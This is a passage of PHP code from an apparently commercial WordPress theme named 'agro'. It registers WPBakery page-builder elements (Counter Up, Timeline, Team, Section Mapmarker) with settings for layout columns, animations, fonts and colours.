                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* Counter
/******************************/
if (!function_exists('agro_counter_integrateWithVC')) {
    add_action('vc_before_init', 'agro_counter_integrateWithVC');
    function agro_counter_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Counter Up', 'agro'),
        'base' => 'agro_counter',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Counter Style', 'agro'),
                'param_name' => 'style',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Style 1', 'agro') => '1',
                    esc_html__('Style 2', 'agro') => '2',
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr0'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'stitle',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'dependency' => array(
                    'element' => 'style',
                    'value' => '1'
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'sthintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'dependency' => array(
                    'element' => 'style',
                    'value' => '1'
                ),
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section Description', 'agro'),
                'dependency' => array(
                    'element' => 'style',
                    'value' => '1'
                ),
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr1',
                'dependency' => array(
                    'element' => 'style',
                    'value' => '1'
                ),
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'hidept',
                'heading' => esc_html__('Disable Section Padding Top?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'dependency' => array(
                    'element' => 'style',
                    'value' => '1'
                ),
            ),
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Counter Up', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Item image', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'number',
                        'heading' => esc_html__('Item Number', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',

                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'afternumber',
                        'heading' => esc_html__('After Number', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',

                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Item Title', 'agro'),
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr2'
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'anim',
                        'heading' => esc_html__('Add animation?', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' )
                    ),
                    array(
                        'type' => 'dropdown',
                        'param_name' => 'aos',
                        'heading' => esc_html__('Animation', 'agro'),
                        'edit_field_class' => 'vc_col-sm-3',
                        'value' => bon_anim_aos(),
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        ),
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'delay',
                        'heading' => esc_html__('Delay', 'agro'),
                        'edit_field_class' => 'vc_col-sm-3',
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'duration',
                        'heading' => esc_html__('Duration', 'agro'),
                        'edit_field_class' => 'vc_col-sm-3',
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'offset',
                        'heading' => esc_html__('Offset', 'agro'),
                        'edit_field_class' => 'vc_col-sm-3',
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        )
                    )
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr3'
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'decimal',
                'heading' => esc_html__('Decimal number?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4'
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('XL Column Width', 'agro'),
                'description' => esc_html__('XL : X-Large Device', 'agro'),
                'param_name' => 'xl',
                'edit_field_class' => 'vc_col-sm-3',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-xl-1',
                    esc_html__('2 column', 'agro') => 'col-xl-2',
                    esc_html__('3 column', 'agro') => 'col-xl-3',
                    esc_html__('4 column', 'agro') => 'col-xl-4',
                    esc_html__('5 column', 'agro') => 'col-xl-5',
                    esc_html__('6 column', 'agro') => 'col-xl-6',
                    esc_html__('7 column', 'agro') => 'col-xl-7',
                    esc_html__('8 column', 'agro') => 'col-xl-8',
                    esc_html__('9 column', 'agro') => 'col-xl-9',
                    esc_html__('10 column', 'agro') => 'col-xl-10',
                    esc_html__('11 column', 'agro') => 'col-xl-11',
                    esc_html__('12 column', 'agro') => 'col-xl-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('LG Column Width', 'agro'),
                'description' => esc_html__('LG : Large Device', 'agro'),
                'param_name' => 'lg',
                'edit_field_class' => 'vc_col-sm-3',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-lg-1',
                    esc_html__('2 column', 'agro') => 'col-lg-2',
                    esc_html__('3 column', 'agro') => 'col-lg-3',
                    esc_html__('4 column', 'agro') => 'col-lg-4',
                    esc_html__('5 column', 'agro') => 'col-lg-5',
                    esc_html__('6 column', 'agro') => 'col-lg-6',
                    esc_html__('7 column', 'agro') => 'col-lg-7',
                    esc_html__('8 column', 'agro') => 'col-lg-8',
                    esc_html__('9 column', 'agro') => 'col-lg-9',
                    esc_html__('10 column', 'agro') => 'col-lg-10',
                    esc_html__('11 column', 'agro') => 'col-lg-11',
                    esc_html__('12 column', 'agro') => 'col-lg-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('MD Column Width', 'agro'),
                'description' => esc_html__('MD : Medium Device', 'agro'),
                'param_name' => 'md',
                'edit_field_class' => 'vc_col-sm-3',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-md-1',
                    esc_html__('2 column', 'agro') => 'col-md-2',
                    esc_html__('3 column', 'agro') => 'col-md-3',
                    esc_html__('4 column', 'agro') => 'col-md-4',
                    esc_html__('5 column', 'agro') => 'col-md-5',
                    esc_html__('6 column', 'agro') => 'col-md-6',
                    esc_html__('7 column', 'agro') => 'col-md-7',
                    esc_html__('8 column', 'agro') => 'col-md-8',
                    esc_html__('9 column', 'agro') => 'col-md-9',
                    esc_html__('10 column', 'agro') => 'col-md-10',
                    esc_html__('11 column', 'agro') => 'col-md-11',
                    esc_html__('12 column', 'agro') => 'col-md-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('SM Column Width', 'agro'),
                'description' => esc_html__('SM : Small Device', 'agro'),
                'param_name' => 'sm',
                'edit_field_class' => 'vc_col-sm-3',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-sm-1',
                    esc_html__('2 column', 'agro') => 'col-sm-2',
                    esc_html__('3 column', 'agro') => 'col-sm-3',
                    esc_html__('4 column', 'agro') => 'col-sm-4',
                    esc_html__('5 column', 'agro') => 'col-sm-5',
                    esc_html__('6 column', 'agro') => 'col-sm-6',
                    esc_html__('7 column', 'agro') => 'col-sm-7',
                    esc_html__('8 column', 'agro') => 'col-sm-8',
                    esc_html__('9 column', 'agro') => 'col-sm-9',
                    esc_html__('10 column', 'agro') => 'col-sm-10',
                    esc_html__('11 column', 'agro') => 'col-sm-11',
                    esc_html__('12 column', 'agro') => 'col-sm-12'
                )
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // colors
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'counter_spacer',
                'heading' => esc_html__('Counter Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'numclr',
                'heading' => esc_html__('Number color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'afternumclr',
                'heading' => esc_html__('After number color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'ntclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* timeline
/******************************/
if (!function_exists('agro_timeline_integrateWithVC')) {
    add_action('vc_before_init', 'agro_timeline_integrateWithVC');
    function agro_timeline_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Timeline', 'agro'),
        'base' => 'agro_timeline',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(

            array(
                'type' => 'textfield',
                'param_name' => 'stitle',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'sthintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'sdesc',
                'heading' => esc_html__('Section Description', 'agro'),
            ),
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Timeline', 'agro'),
                'group' => esc_html__('Timeline', 'agro'),
                'params' => array(
                    array(
                        'type' => 'textfield',
                        'param_name' => 'year',
                        'heading' => esc_html__('Item Year', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',

                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Item Title', 'agro'),
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'desc',
                        'heading' => esc_html__('Item Description', 'agro'),
                    ),
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('MD Column Width', 'agro'),
                'description' => esc_html__('MD : Medium Device', 'agro'),
                'group' => esc_html__('Timeline', 'agro'),
                'param_name' => 'md',
                'edit_field_class' => 'vc_col-sm-3',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('3 column', 'agro') => 'col-md-3',
                    esc_html__('4 column', 'agro') => 'col-md-4',
                    esc_html__('5 column', 'agro') => 'col-md-5',
                    esc_html__('6 column', 'agro') => 'col-md-6',
                    esc_html__('7 column', 'agro') => 'col-md-7',
                    esc_html__('8 column', 'agro') => 'col-md-8',
                    esc_html__('9 column', 'agro') => 'col-md-9',
                    esc_html__('10 column', 'agro') => 'col-md-10',
                    esc_html__('11 column', 'agro') => 'col-md-11',
                    esc_html__('12 column', 'agro') => 'col-md-12'
                )
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'time_spacer',
                'heading' => esc_html__('Timeline Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'timelineclr',
                'heading' => esc_html__('Timeline point color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'yearclr',
                'heading' => esc_html__('Year color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'timetclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'timedescclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background Image', 'agro')
            )
        )));
    }
}

/*******************************/
/* team
/******************************/
if (!function_exists('agro_team_integrateWithVC')) {
    add_action('vc_before_init', 'agro_team_integrateWithVC');
    function agro_team_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Team', 'agro'),
        'base' => 'agro_team',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'stitle',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'sthintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'sdesc',
                'heading' => esc_html__('Section Description', 'agro'),
            ),

            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Your Team', 'agro'),
                'group' => esc_html__('Team', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Team image', 'agro'),
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'name',
                        'heading' => esc_html__('Team Name', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',

                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'job',
                        'heading' => esc_html__('Team Job', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'anim',
                        'heading' => esc_html__('Add animation?', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' )
                    ),
                    array(
                        'type' => 'dropdown',
                        'param_name' => 'aos',
                        'heading' => esc_html__('Animation', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'value' => bon_anim_aos(),
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        ),
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'delay',
                        'heading' => esc_html__('Animation delay/duration', 'agro'),
                        'description' => esc_html__('Simple style 2 animation duration', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'offset',
                        'heading' => esc_html__('Animation offset', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'img_url',
                        'heading' => esc_html__('Team item img url', 'agro'),
                    ),
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('LG Column Width', 'agro'),
                'description' => esc_html__('LG : Large Device', 'agro'),
                'group' => esc_html__('Team', 'agro'),
                'param_name' => 'lg',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('3 column', 'agro') => 'col-lg-3',
                    esc_html__('4 column', 'agro') => 'col-lg-4',
                    esc_html__('5 column', 'agro') => 'col-lg-5',
                    esc_html__('6 column', 'agro') => 'col-lg-6',
                    esc_html__('7 column', 'agro') => 'col-lg-7',
                    esc_html__('8 column', 'agro') => 'col-lg-8',
                    esc_html__('9 column', 'agro') => 'col-lg-9',
                    esc_html__('10 column', 'agro') => 'col-lg-10',
                    esc_html__('11 column', 'agro') => 'col-lg-11',
                    esc_html__('12 column', 'agro') => 'col-lg-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('MD Column Width', 'agro'),
                'description' => esc_html__('MD : Medium Device', 'agro'),
                'group' => esc_html__('Team', 'agro'),
                'param_name' => 'md',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('3 column', 'agro') => 'col-md-3',
                    esc_html__('4 column', 'agro') => 'col-md-4',
                    esc_html__('5 column', 'agro') => 'col-md-5',
                    esc_html__('6 column', 'agro') => 'col-md-6',
                    esc_html__('7 column', 'agro') => 'col-md-7',
                    esc_html__('8 column', 'agro') => 'col-md-8',
                    esc_html__('9 column', 'agro') => 'col-md-9',
                    esc_html__('10 column', 'agro') => 'col-md-10',
                    esc_html__('11 column', 'agro') => 'col-md-11',
                    esc_html__('12 column', 'agro') => 'col-md-12'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw2',
                'heading' => esc_html__('Team Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Team', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh2',
                'heading' => esc_html__('Team Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Team', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'time_spacer',
                'heading' => esc_html__('Team Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'nameclr',
                'heading' => esc_html__('Name color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'jobclr',
                'heading' => esc_html__('Job color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'contentclr',
                'heading' => esc_html__('Text content color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* section_mapmarker
/******************************/
if (!function_exists('agro_section_mapmarker_integrateWithVC')) {
    add_action('vc_before_init', 'agro_section_mapmarker_integrateWithVC');
    function agro_section_mapmarker_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Section Mapmarker', 'agro'),
        'base' => 'agro_section_mapmarker',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
            ),
            // section description
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section Description', 'agro'),
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'anim',
                'heading' => esc_html__('Add animation?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'dropdown',
                'param_name' => 'aos',
                'heading' => esc_html__('Animation', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'value' => bon_anim_aos(),
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'delay',
                'heading' => esc_html__('Animation delay', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'offset',
                'heading' => esc_html__('Animation offset', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            // section image
            array(
                'type' => 'attach_image',
                'param_name' => 'bgimg',
                'heading' => esc_html__('Background image', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw1',
                'heading' => esc_html__('Background image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh1',
                'heading' => esc_html__('Background image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'anim2',
                'heading' => esc_html__('Add animation?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
            ),
            array(
                'type' => 'dropdown',
                'param_name' => 'aos2',
                'heading' => esc_html__('Animation', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'value' => bon_anim_aos(),
                'dependency' => array(
                    'element' => 'anim2',
                    'not_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'duration2',
                'heading' => esc_html__('Animation duration', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
